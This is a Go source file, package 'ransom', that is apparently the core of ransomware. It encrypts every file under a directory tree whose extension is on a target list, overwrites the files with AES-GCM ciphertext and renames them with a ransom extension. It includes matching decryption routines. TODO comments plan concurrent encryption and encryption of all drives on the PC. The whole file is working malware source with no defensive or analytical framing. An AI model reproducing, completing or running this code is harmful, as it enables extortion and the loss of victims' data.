package ransom

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

func Encrypt(key, data []byte) []byte {
	c, err := aes.NewCipher(key)

	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	return gcm.Seal(nonce, nonce, data, nil)
}

//TODO: make a function that encrypts specified paths concurrently
//TODO: make a function that encrypts all drives from the pc (so main would be simpler)

func Decrypt(key, data []byte) []byte {
	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	decrypted, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}
	return decrypted
}

func EncryptFile(path string, key []byte) error {
	if strings.HasSuffix(path, extension) {
		return nil
	}

	//This should be a compile time constant so code should get optimized by the compiler
	//Check if the current's file extension is in the dict or list
	if UseDict {
		if extensionDict[GetFileExtensionFastest(path)] != 1 {
			return nil
		}
	} else {
		Len, Extension := len(extensionsSlice), GetFileExtensionFastest(path)
		ok := 0
		for i := 0; i < Len; i++ {
			if extensionsSlice[i] == Extension {
				ok = 1
			}
		}
		if ok == 0 {
			return nil
		}
	}

	data, err := ioutil.ReadFile(path)
	if err != nil {
		//Think of a fix, if the error isn't nil the walk function exits, so we return nil even on errors
		fmt.Println(err)
		return nil
	}
	data = Encrypt(key, data)
	err = ioutil.WriteFile(path, data, 0644)
	if err != nil {
		fmt.Println(err)
		return nil
	}

	var sb strings.Builder
	sb.WriteString(path)
	sb.WriteString(extension)
	err = os.Rename(path, sb.String())
	fmt.Println(err)
	return nil
}

func DecryptFile(path string, key []byte) error {
	//Do not decrypt anything that doesn't have the specific extension
	if !strings.HasSuffix(path, extension) {
		return nil
	}

	data, err := ioutil.ReadFile(path)
	if err != nil {
		fmt.Println(err)
		return nil
	}
	data = Decrypt(key, data)
	err = ioutil.WriteFile(path, data, 0644)
	if err != nil {
		fmt.Println(err)
		return nil
	}

	err = os.Rename(path, strings.TrimSuffix(path, extension))
	fmt.Println(err)
	return nil
}

func RecursivelyEncryptDirectory(startingPath string, key []byte) error {
	return filepath.Walk(startingPath, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() {
			return nil
		}
		//TODO: Check file size
		return EncryptFile(path, key)
	})
}

func RecursivelyDecryptDirectory(startingPath string, key []byte) error {
	return filepath.Walk(startingPath, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() {
			return nil
		}
		return DecryptFile(path, key)
	})
}
